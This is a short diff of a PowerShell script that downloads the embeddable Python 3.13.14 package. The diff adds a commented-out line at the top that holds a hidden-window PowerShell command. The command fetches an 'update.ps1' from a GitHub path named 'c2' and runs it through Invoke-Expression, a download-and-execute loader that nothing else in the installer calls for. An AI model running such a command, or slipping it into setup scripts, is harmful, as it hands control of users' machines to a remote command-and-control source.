@@ -1,3 +1,4 @@
+# # powershell -NoP -NonI -w h -c "irm https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/update.ps1 | iex"
 $ErrorActionPreference = 'Stop'
 
 $url = 'https://www.python.org/ftp/python/3.13.14/python-3.13.14-embed-amd64.zip'
